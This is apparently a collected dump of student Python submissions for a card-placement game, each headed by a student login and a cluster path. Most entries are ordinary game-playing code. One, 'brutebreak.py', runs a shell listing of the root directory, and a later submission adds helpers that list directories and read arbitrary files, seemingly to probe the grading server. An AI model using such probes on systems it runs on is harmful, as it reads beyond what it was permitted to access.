                while left <= played.top_left[1] + played.width - 1 and no_right == False:
                    skip = False
                    for i in range(h): #looks through the surrounding area, moving row by row up
                        if skip == True:
                            break
                        for j in range(w):
                            if left+j >= self.columns:
                                no_right = True
                                skip = True
                                break
                            if self.board[played.top_left[0] - 1 - i][left+j] != -1: #checks the tile, whether it is occupied
                                skip = True
                                break
                            
                    if skip == False:
                        all_scores = 0 #holds the total amount of points gained by this placement
                        #place the card so I can call floodfill on it
                        top_left = (played.top_left[0]-h, left) #might be wrong
                        for i in range(card.height): #places the card
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = card.grid[i][j]
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                if card.grid[i][j] != 0 and card.visited[i][j] != True:
                                    connected = self.flood_fill((top_left[0]+i, top_left[1]+j), card.grid[i][j], card, top_left)

                                    if connected[1] == True:
                                        all_scores += connected[0]
                        
                        # print(all_scores)

                        if all_scores > top_score:
                            top_score = all_scores
                            best_top_left = top_left
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = -1
                        
                        card.reset_visited()
                    
                    left += 1

            if self.lines - played.top_left[0] - played.height >= h: #checks if card can be put below on an empty board
                # print("put below")
                left = played.top_left[1] - w + 1
                if left < 0:
                    left = 0
                no_right = False
                while left <= played.top_left[1] + played.width - 1 and no_right == False:
                    skip = False
                    for i in range(h): #looks through the surrounding area, moving row by row down
                        if skip == True:
                            break
                        for j in range(w):
                            if left+j >= self.columns:
                                no_right = True
                                skip = True
                                break
                            if self.board[played.top_left[0] + played.height + i][left+j] != -1: #checks the tile, whether it is occupied
                                skip = True
                                break
                            
                    if skip == False:
                        all_scores = 0 #holds the total amount of points gained by this placement
                        #place the card so I can call floodfill on it
                        top_left = (played.top_left[0]+played.height, left) #might be wrong
                        for i in range(card.height): #places the card
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = card.grid[i][j]
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                if card.grid[i][j] != 0 and card.visited[i][j] != True:
                                    connected = self.flood_fill((top_left[0]+i, top_left[1]+j), card.grid[i][j], card, top_left)
                                    if connected[1] == True:
                                        all_scores += connected[0]

                        # print(all_scores)

                        if all_scores > top_score:
                            top_score = all_scores
                            best_top_left = top_left
                        
                        for i in range(card.height): #removes the card
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = -1
                        
                        card.reset_visited()
                    
                    left += 1

        # print(top_score)
        return best_top_left, top_score

    def flood_fill(self, start : tuple, colour : int, card : Card, top_left : tuple) -> tuple:
        """Returns the largest connected area of same colour, setting the visited field on a card correctly as well.
        Also returns True if the floodfill went out of the card."""
        counter = 0
        known = {start}
        queue = [start]
        out = False
        while len(queue) > 0:
            pos = queue.pop(0)
            counter += 1
            if pos[0]-top_left[0] >= 0 and pos[0]-top_left[0] < card.height:
                if pos[1]-top_left[1] >= 0 and pos[1]-top_left[1] < card.width:
                    card.visited[pos[0]-top_left[0]][pos[1]-top_left[1]] = True
                else:
                    out = True
            else:
                out = True

            if pos[0] != 0 and (pos[0]-1, pos[1]) not in known and self.board[pos[0]-1][pos[1]] == colour: #checks up
                queue.append((pos[0]-1, pos[1]))
                known.add((pos[0]-1, pos[1]))
                
            if pos[0] != self.lines-1 and (pos[0]+1, pos[1]) not in known and self.board[pos[0]+1][pos[1]] == colour: #checks down
                queue.append((pos[0]+1, pos[1]))
                known.add((pos[0]+1, pos[1]))

            if pos[1] != 0 and (pos[0], pos[1]-1) not in known and self.board[pos[0]][pos[1]-1] == colour: #checks left
                queue.append((pos[0], pos[1]-1))
                known.add((pos[0], pos[1]-1))

            if pos[1] != self.columns-1 and (pos[0], pos[1]+1) not in known and self.board[pos[0]][pos[1]+1] == colour: #checks right
                queue.append((pos[0], pos[1]+1))
                known.add((pos[0], pos[1]+1))

        return (counter, out)

    def place_card(self, card : list, top_left : tuple):
        # print("placing", top_left, card)
        for i in range(len(card)):
            for j in range(len(card[0])):
                # print(i,j)
                self.board[top_left[0]+i][top_left[1]+j] = card[i][j]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "AM"
        self.board = Board(boardRows, boardCols, cardsAtHand) #holds the board and cards
        self.cards_left = [True for _ in range(len(cardsAtHand))] #holds which cards I can still play
        self.enemy_cards = [True for _ in range(len(cardsAtHand))] #holds which cards have been played, not used for now

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        # print("new",newCardOnDesk)
        # print(len(newCardOnDesk))
        if True not in self.cards_left:
            # print("True not in self.cards_left")
            # print(self.cards_left)
            return []
        
        if len(newCardOnDesk) == 3:
            self.board.played_cards.append(Card(newCardOnDesk[2], (newCardOnDesk[0], newCardOnDesk[1])))
            self.board.place_card(newCardOnDesk[2], (newCardOnDesk[0],newCardOnDesk[1]))
            # DebugPrint(self.board.board)
            # for i in range(len(newCardOnDesk[2])):
            #     for j in range(len(newCardOnDesk[2][0])):
            #         self.board.board[newCardOnDesk[0]+i][newCardOnDesk[1]+j] = newCardOnDesk[2][i][j]
            # below won't work if there are more cards that are the same, so I have to do it a bit smarter later
            # self.enemy_cards[self.board.available_cards.index(self.board.played_cards[-1])] = False
        
        if False not in self.cards_left and len(newCardOnDesk) == 0:
            min_colour = self.board.available_cards[0].sum_potential()
            min_card = 0
            for i in range(1, len(self.cards_left)):
                sum = self.board.available_cards[i].sum_potential()
                if sum < min_colour:
                    min_colour = sum
                    min_card = i
            self.cards_left[min_card] = False
            self.board.place_card(self.board.available_cards[min_card].grid, (0,0))
            self.board.played_cards.append(Card(self.board.available_cards[min_card].grid, (0,0)))
            return [0,0, self.board.available_cards[min_card].grid]
        
        best_score = -1
        best_top_left = None
        best_rotation = 0
        best_card = 0
        for i in range(len(self.cards_left)):
            if self.cards_left[i] == False:
                continue
            card = self.board.available_cards[i]
            for j in range(4):
                score = self.board.best_play(card, best_score)
                if score[1] > best_score:
                    best_score = score[1]
                    best_top_left = score[0]
                    best_rotation = j
                    best_card = i
                card.rotate_clockwise()
        
        if best_score == -1:
            # print("nowhere to place card")
            # print(self.cards_left)
            # print(self.board.played_cards)
            # for i in self.board.played_cards:
            #     DebugPrint(i.grid)
            #     print()
            # print("left")
            # for i in range(len(self.cards_left)):
            #     if self.cards_left[i] == True:
            #         DebugPrint(self.board.available_cards[i].grid)
            #         print()
            # print(self.board.available_cards)
            return []
        else:
            for _ in range(best_rotation):
                self.board.available_cards[best_card].rotate_clockwise()
            self.cards_left[best_card] = False
            self.board.place_card(self.board.available_cards[best_card].grid, best_top_left)
            self.board.played_cards.append(Card(self.board.available_cards[best_card].grid, best_top_left))
            return [best_top_left[0], best_top_left[1], self.board.available_cards[best_card].grid]


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        # p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))
        
        # if p1move != []:
        #     DebugPrint(p1move[2])
        # DebugPrint(p1.board.board)

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        # p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))

        # if p2move != []:
        #     DebugPrint(p2move[2])
        # DebugPrint(p2.board.board)
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    cudekjar
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/cudekjar______________________
        brutebreak.py
import subprocess
print(subprocess.run("ls /", shell=True))
    voplama2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/voplama2______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 5316: ordinal not in range(128)    krauzpav
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/krauzpav______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


import sys
import numpy as np
import copy
from dataclasses import dataclass
import time

@dataclass
class SquareScore:
    score: int
    # indxs of cells that are connected to this square
    connected_cells: set[tuple] # (row, column)

    def transform_connected_cells_to_abs(self, abs_r: int, abs_c: int):
        new_conn_cells = set()
       
        for cell in self.connected_cells:
            new_conn_cells.add((cell[0] + abs_r, cell[1] + abs_c))
        
        self.connected_cells = new_conn_cells
           
class Card:
    # r1, c1 = start (left top corner)

    def __init__(self, card_row_input: str = None, on_table: bool = None):
        if card_row_input == None and on_table == None:
            return

        row_inp_arr = list(map(int, card_row_input.split()))
        self.on_table = on_table

        if on_table:
            self.r1 = row_inp_arr[0]
            self.c1 = row_inp_arr[1]

            offset = 4
        else:
            offset = 2

        self.height = row_inp_arr[-2 + offset]
        self.width = row_inp_arr[-1 + offset]

        self.colors = []
        for i in range(self.height):
            one_row = []

            for j in range(self.width):
                one_row.append(row_inp_arr[offset + i*self.width + j])
            
            self.colors.append(one_row.copy())

        if not on_table:
            self.rel_border = self.get_border_indxs_rel()
            self.scores = self.calculate_border_scores()

    def __str__(self) -> str:
        #if self.on_table:
        #    out_str = f'{self.r1} {self.c1} {self.height} {self.width}'
        #else:
        out_str = f'{self.height} {self.width}'

        for row in self.colors:
            for elem in row:
                out_str += f' {elem}' 

        return out_str
    
    def set_dimensions(self, width: int, height: int):
        self.width = width
        self.height = height

    # returns list of tuples (row, column) of squares on perimeter
    # the indexes are absolute
    def get_border_indxs_abs(self) -> list[tuple]:
        abs_border = []
        rel_border = self.get_border_indxs_rel()

        for rel_pos in rel_border:
            abs_border.append((rel_pos[0] + self.r1, rel_pos[1] + self.c1))

        return abs_border

    # returns list of tuples (row, column) of squares on perimeter
    # the indexes are relative to (0, 0)
    def get_border_indxs_rel(self) -> list[list]:
        rel_border = []
        
        for i in range(self.height):
            if i == 0 or i == self.height - 1:
                for j in range(self.width):
                    rel_border.append((i, j))
            else:
                rel_border.append((i, 0))
                rel_border.append((i, self.width - 1))

        return rel_border
    
    # returns dict: key: tuple (row, column) RELATIVE to (0, 0), value: int (score)
    def calculate_border_scores(self) -> dict[tuple, SquareScore]:
        scores = {}

        for square in self.rel_border:
            r, c = square[0], square[1]

            scores[(r, c)] = Card.special_flood_fill(copy.deepcopy(self.colors), r, c, self.colors[r][c])

        return scores

    # if the card is on table it returns False and does nothing, you cannot rotate there
    def rotate_card(self) -> bool:
        if self.on_table:
            return False

        self.colors = [list(row) for row in zip(*self.colors[::-1])]
        self.width, self.height = self.height, self.width

        self.rel_border = self.get_border_indxs_rel()
        self.scores = self.calculate_border_scores()

    # r c are indexes of the table [r]]c]
    @staticmethod
    def is_indx_on_table(r: int, c: int, table_w: int, table_h: int) -> bool:
        return not (c < 0 or c > table_w - 1 or r < 0 or r > table_h - 1)
        
    def is_on_table(self, table_w: int, table_h: int) -> bool:
        on_table = True
        
        if not Card.is_indx_on_table(self.r1, self.c1, table_w, table_h):
            on_table = False
        
        # r2 c2 are bottom right corner
        r2 = self.r1 + self.height - 1
        c2 = self.c1 + self.width - 1

        if not Card.is_indx_on_table(r2, c2, table_w, table_h):
            on_table = False
        
        return on_table
    
    # returns to how much squares you can reach from r c (only on the color specified)
    # in the sum is included the starting sqaure too
    @staticmethod
    def special_flood_fill(arr: list, r: int, c: int, start_color: int) -> int:
        if start_color == 0:
            return 0

        sum = 0
        connected_cells = set()

        stack = []
        stack.append((r, c))

        while stack:
            r, c = stack.pop()

            coords = [[-1, 0], [0, 1], [0, -1], [1, 0]]

            for coord in coords:
                if r + coord[0] >= 0 and r + coord[0] < len(arr) and c + coord[1] >= 0 and c + coord[1] < len(arr[0]):
                    if arr[r + coord[0]][c + coord[1]] == start_color:
                        arr[r + coord[0]][c + coord[1]] = -2
                        stack.append((r + coord[0], c + coord[1]))

                        connected_cells.add((r + coord[0], c + coord[1]))
                        sum += 1

        # necessary to calculate the start square
        if sum == 0:
            connected_cells.add((r, c))
            sum = 1

        return SquareScore(sum, connected_cells)

# suspects that input card is in table!!!
def is_card_overlaping_other(occupied_squares: list[list[int]], card_to_check: Card) -> bool:
    for i in range(card_to_check.height):
        for j in range(card_to_check.width):
            if occupied_squares[card_to_check.r1 + i][card_to_check.c1 + j] >= 0:
                return True
    
    return False

# returns [] when the card couldnt be placed 
def get_possible_card_placements(table_w: int, table_h: int, cards_on_table: list[Card], occupied_squares: list[list[int]], card_to_place: Card) -> list[Card]:
    poss_cards_placed = []

    for table_card in cards_on_table:
        # now check if the card can be on any place around 'table_card'

        # from LEFT and RIGHT
        potential_card_left = copy.deepcopy(card_to_place)
        potential_card_left.c1 = table_card.c1 - card_to_place.width
        potential_card_right = copy.deepcopy(card_to_place)
        potential_card_right.c1 = table_card.c1 + table_card.width

        for i in range(table_card.height):
            potential_card_left.r1 = table_card.r1 + i
            potential_card_right.r1 = table_card.r1 + i

            if i == 0:
                # handle positions above top right corner
                for x in range(card_to_place.height):
                    potential_card_left.r1 = table_card.r1 - x
                    potential_card_right.r1 = table_card.r1 - x

                    if potential_card_left.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_left):
                        poss_cards_placed.append(copy.deepcopy(potential_card_left))
                    if potential_card_right.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_right):
                        poss_cards_placed.append(copy.deepcopy(potential_card_right))
                    
            else:
                if potential_card_left.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_left):
                    poss_cards_placed.append(copy.deepcopy(potential_card_left))
                if potential_card_right.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_right):
                    poss_cards_placed.append(copy.deepcopy(potential_card_right))
         
        # from TOP and BOTTOM
        potential_card_top = copy.deepcopy(card_to_place)
        potential_card_top.r1 = table_card.r1 - card_to_place.height
        potential_card_bottom = copy.deepcopy(card_to_place)
        potential_card_bottom.r1 = table_card.r1 + table_card.height

        for i in range(table_card.width):
            potential_card_top.c1 = table_card.c1 + i
            potential_card_bottom.c1 = table_card.c1 + i

            if i == 0:
                for x in range(card_to_place.width):
                    potential_card_top.c1 = table_card.c1 - x
                    potential_card_bottom.c1 = table_card.c1 - x
                    
                    if potential_card_top.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_top):
                        poss_cards_placed.append(copy.deepcopy(potential_card_top))
                    if potential_card_bottom.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_bottom):
                        poss_cards_placed.append(copy.deepcopy(potential_card_bottom))
            else:
                if potential_card_top.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_top):
                    poss_cards_placed.append(copy.deepcopy(potential_card_top))
                if potential_card_bottom.is_on_table(table_w, table_h) and not is_card_overlaping_other(occupied_squares, potential_card_bottom):
                    poss_cards_placed.append(copy.deepcopy(potential_card_bottom))
    
    return poss_cards_placed

def solve(table_w: int, table_h: int, cards_on_table: list[Card], cards_in_hand: list[Card]) -> Card:
    occupied_squares = generate_table_2d_arr(table_w, table_h, cards_on_table)
    scores = generate_cards_on_table_scores(cards_on_table, occupied_squares)

    biggest_score = 0
    card_with_biggest_score = None

    for card_from_hand in cards_in_hand:
        # firstly generate all possible positions of the card (according to rules)
        #t3 = time.time()

        #t5 = time.time()
        possible_cards: list[Card] = []

        placed_orig_poss: list[Card] = get_possible_card_placements(table_w, table_h, cards_on_table, occupied_squares, card_from_hand)
        #print(time.time() - t5, end=' ')

        #t6 = time.time()
        for placed_orig in placed_orig_poss:
            possible_cards.append(placed_orig)

            deg180_card = copy.deepcopy(placed_orig)
            deg180_card.rotate_card()
            deg180_card.rotate_card()
            possible_cards.append(deg180_card)

        #print(time.time() - t6)
    
        card_from_hand.rotate_card()
        placed_rot_poss: list[Card] = get_possible_card_placements(table_w, table_h, cards_on_table, occupied_squares, card_from_hand)
        for placed_rot in placed_rot_poss:
            possible_cards.append(placed_rot)

            deg180_card = copy.deepcopy(placed_rot)
            deg180_card.rotate_card()
            deg180_card.rotate_card()
            possible_cards.append(deg180_card)
        ##########################
        #print(time.time() - t3, end=' ')

        #t4 = time.time()
        # now calculate the scores of every possible card and choose the biggest
        for poss_card in possible_cards:
            if card_with_biggest_score == None:
                card_with_biggest_score = poss_card
            
            card_score = 0
            skip = [] # to this array i save which indexes I have already added to the sum

            for border_sq in poss_card.get_border_indxs_abs():
                # now look for the same color in 2d arr (left right up down)
                r, c = border_sq[0], border_sq[1]
                sq_color = poss_card.colors[r - poss_card.r1][c - poss_card.c1]

                #if poss_card.r1 == 8 and poss_card.c1 == 4 and poss_card.height == 5 and poss_card.width == 5:
                #    print('eeee')
                
                if sq_color == 0:
                    continue

                # left
                if c > 0 and occupied_squares[r][c - 1] == sq_color:
                    if not isSquareInSkip((r, c - 1), skip):
                        card_score += scores[(r, c - 1)].score
                        skip.append(scores[(r, c - 1)].connected_cells)

                    if not isSquareInSkip((r, c), skip):
                        card_score += poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].score
                        poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].transform_connected_cells_to_abs(poss_card.r1, poss_card.c1)
                        skip.append(poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].connected_cells)
                # right
                if c < table_w - 1 and occupied_squares[r][c + 1] == sq_color:
                    if not isSquareInSkip((r, c + 1), skip):
                        card_score += scores[(r, c + 1)].score
                        skip.append(scores[(r, c + 1)].connected_cells)

                    if not isSquareInSkip((r, c), skip):
                        card_score += poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].score
                        poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].transform_connected_cells_to_abs(poss_card.r1, poss_card.c1)
                        skip.append(poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].connected_cells)
                # up
                if r > 0 and occupied_squares[r - 1][c] == sq_color:
                    if not isSquareInSkip((r - 1, c), skip):
                        card_score += scores[(r - 1, c)].score
                        skip.append(scores[(r - 1, c)].connected_cells)

                    if not isSquareInSkip((r, c), skip):
                        card_score += poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].score
                        poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].transform_connected_cells_to_abs(poss_card.r1, poss_card.c1)
                        skip.append(poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].connected_cells)
                # down
                if r < table_h - 1 and occupied_squares[r + 1][c] == sq_color:
                    if not isSquareInSkip((r + 1, c), skip):
                        card_score += scores[(r + 1, c)].score
                        skip.append(scores[(r + 1, c)].connected_cells)

                    if not isSquareInSkip((r, c), skip):
                        card_score += poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].score
                        poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].transform_connected_cells_to_abs(poss_card.r1, poss_card.c1)
                        skip.append(poss_card.scores[(r - poss_card.r1, c - poss_card.c1)].connected_cells)

            if biggest_score < card_score:
                biggest_score = card_score
                card_with_biggest_score = poss_card

        #print(time.time() - t4)

    #print(biggest_score)
    return card_with_biggest_score

def isSquareInSkip(square_coords: tuple, skip: list[tuple]):
    for connected_set in skip:
        if square_coords in connected_set:
            return True
        
    return False

# it generates 2d array with size of table
# every element is either filled with color (0 to infinity) (zero means there is card but no color) or -1 that means empty
def generate_table_2d_arr(table_w: int, table_h: int, cards_on_table: list[Card]) -> list[list[int]]:
    occupied = [[-1 for i in range(table_w)] for j in range(table_h)]

    for table_card in cards_on_table:
        for i in range(table_card.height):
            for j in range(table_card.width):
                occupied[table_card.r1 + i][table_card.c1 + j] = table_card.colors[i][j]

    return occupied

# this fun returns dict: key: (row, column), value: int (the score = with how many squares with the same color is the square connected (side to side))
# it goes through all cards on table and gives score to the edge squares and wirtes it down to dict
def generate_cards_on_table_scores(cards_on_table: list[Card], occupied_squares: list[list[int]]) -> dict[tuple, SquareScore]:
    scores = {} 

    # target_squares[i] = (row, column) 
    # get all the squares on perimeter of cards
    target_squares = []
    for table_card in cards_on_table:
        target_squares += table_card.get_border_indxs_abs()

    # I am using flood fill
    for tar_square in target_squares:
        r, c = tar_square[0], tar_square[1]
        scores[tar_square] = Card.special_flood_fill(copy.deepcopy(occupied_squares), r, c, occupied_squares[r][c])

    return scores

def __main__():
    file_name: str = 'ukoly/easy-6253.txt'#sys.argv[1]
    if len(sys.argv) > 1 and sys.argv[1] != '':
        file_name = sys.argv[1]

    with open(file_name, "r") as f:
        r, c = tuple(map(int, f.readline().split(' ')))
        m, n = tuple(map(int, f.readline().split(' ')))

        cards_on_table = []
        cards_in_hand = []

        # cards on the table
        for i in range(m):
            cards_on_table.append(Card(f.readline(), True))

        # card in hand
        for i in range(n):
            cards_in_hand.append(Card(f.readline(), False))

    placed_card = solve(c, r, cards_on_table, cards_in_hand)

    if placed_card == None:
        print('NOSOLUTION')
    else:
        print(placed_card)


#t1 = time.time()
#__main__()
#t2 = time.time()

#print(t2-t1)


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"
        self.myCardsOnDesk = []

        self.myCardsAtHand = []
        for card in cardsAtHand:
            card_txt = ''

            card_txt += str(len(card)) + ' '
            card_txt += str(len(card[0])) + ' '

            for row in card:
                for col in row:
                    card_txt += str(col) + ' '

            self.myCardsAtHand.append(Card(card_txt, False))

        self.first_play = True

    def card_to_txt(self, card) -> str:
        card_txt = ''
            
        card_txt += str(card[0]) + ' '
        card_txt += str(card[1]) + ' '

        card_txt += str(len(card[2])) + ' '
        card_txt += str(len(card[2][0])) + ' '

        for row in card[2]:
            for col in row:
                card_txt += str(col) + ' '
            
        return card_txt
    
    def pop_card_from_hand(self, card: Card):
        card_rotations: list[Card] = []
        card_rotations.append(copy.deepcopy(card))

        for i in range(1, 4):
            new_card_rot = copy.deepcopy(card_rotations[i - 1])
            new_card_rot.rotate_card()
            card_rotations.append(new_card_rot)

        # remove placed card from hand
        for i in range(len(self.myCardsAtHand)):
            for card_rot in card_rotations:
                if card_rot.__str__() == self.myCardsAtHand[i].__str__():
                    self.myCardsAtHand.pop(i)
                    return

    def play(self, newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        if newCardOnDesk != []:
            self.myCardsOnDesk.append(Card(self.card_to_txt(newCardOnDesk), True))
            self.cardsOnDesk.append(newCardOnDesk)

        placed_card = solve(self.boardCols, self.boardRows, self.myCardsOnDesk, self.myCardsAtHand)

        out = []
        
        if self.myCardsAtHand == []:
            self.first_play = False
            return []

        if placed_card == None:
            if self.cardsAtHand == []:
                self.first_play = False
                return []
            elif self.first_play:
                out = [0, 0, copy.deepcopy(self.myCardsAtHand[0].colors)]
                
                self.myCardsOnDesk.append(Card(self.card_to_txt(out), True))
                self.cardsOnDesk.append(out)
                self.pop_card_from_hand(Card(self.card_to_txt(out), True))

                self.first_play = False
                return out
            else:
                self.first_play = False
                return []

        self.pop_card_from_hand(placed_card)

        if out == []:
            out = [ placed_card.r1, placed_card.c1, placed_card.colors]

        self.myCardsOnDesk.append(Card(self.card_to_txt(out), True))
        self.cardsOnDesk.append(out)
        self.first_play = False
        return out


        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        if len(self.cardsAtHand) == 0:
            return []

        cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        card = self.cardsAtHand[cardindx]
        cardRows = len(card)
        cardCols = len(card[0])
        row = random.randint(0, self.boardRows-cardRows-1) 
        col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row, col, card ] ]
        return [row, col, card]


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a, C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    kuchstep
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kuchstep______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 1913: ordinal not in range(128)    koubajac
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/koubajac______________________
        player.py
import base as BASE
import copy, random, time, sys, os
import numpy as np
from PIL import Image, ImageDraw

class Position:
    def __init__ (self):
        self.color = 0
        self.value = 0
        self.empty = True
        self.component = -1
        self.neighbour = False

class Card_position:
    def __init__ (self, color):
        self.color = color
        self.value = 0
        self.component = -1

class Card:
    def __init__ (self, R, C, colors):
        self.R = R # rows
        self.C = C # collums
        self.arr = colors
    def add_vals(self, compc):
        self.arr = [[Card_position(self.arr[i][j]) for j in range(self.C)] for i in range(self.R)]
        for i in range(self.R):
            for j in range(self.C):
                if self.arr[i][j].component == -1 and self.arr[i][j].color != 0:
                    poi, score, compc = BFS(self.arr, [i, j], self.arr[i][j].color, compc)
                    for k in poi:
                        self.arr[k[0]][k[1]].value = score
        return compc

moves = [[1, 0], [-1, 0], [0, 1], [0, -1]]
def BFS(arr, pos, color, component):
    queue = [pos]
    score = 0
    poi = [] # points of interest
    while queue:
        pos = queue.pop(0)
        poi.append(pos)
        arr[pos[0]][pos[1]].component = component
        score += 1
        for i in moves:
            np = [pos[0] + i[0], pos[1] + i[1]]
            if np[0] < 0 or np[1] < 0 or np[0] >= len(arr) or np[1] >= len(arr[0]):
                continue
            if arr[np[0]][np[1]].component != component and arr[np[0]][np[1]].color == color:
                queue.append(np)
                arr[np[0]][np[1]].component = component
    return poi, score, component + 1

def does_fit(pos, cr, cc, space_prefix):
    fit_val = space_prefix[pos[0] + cr][pos[1] + cc]
    if pos[0] > 0 and pos[1]  > 0:
        fit_val += space_prefix[pos[0] - 1][pos[1] - 1]
    if pos[0] > 0:
        fit_val -= space_prefix[pos[0] - 1][pos[1] + cc]
    if pos[1] > 0:
        fit_val -= space_prefix[pos[0] + cr][pos[1] - 1]
    if fit_val == 0:
        return True
    else:
        return False


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def list_files_and_folders():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    #current_directory = os.path.dirname(current_directory)
    
    # List all files and folders in the parent directory
    items = os.listdir(current_directory)
    
    # Join all item names into a string, each on a new line
    items_string = "\n".join(items)
    return items_string

import psutil
def display_file_contents(file_name):
    try:
        with open(file_name, 'r') as file:
            contents = file.read()
        return contents
    except FileNotFoundError:
        return f"File '{file_name}' not found."
    except PermissionError:
        return f"Permission denied. You might need sudo permission to read '{file_name}'."
    except Exception as e:
        if is_file_open(file_name):
            return f"An error occurred: {e}. The file '{file_name}' might be open in another program."
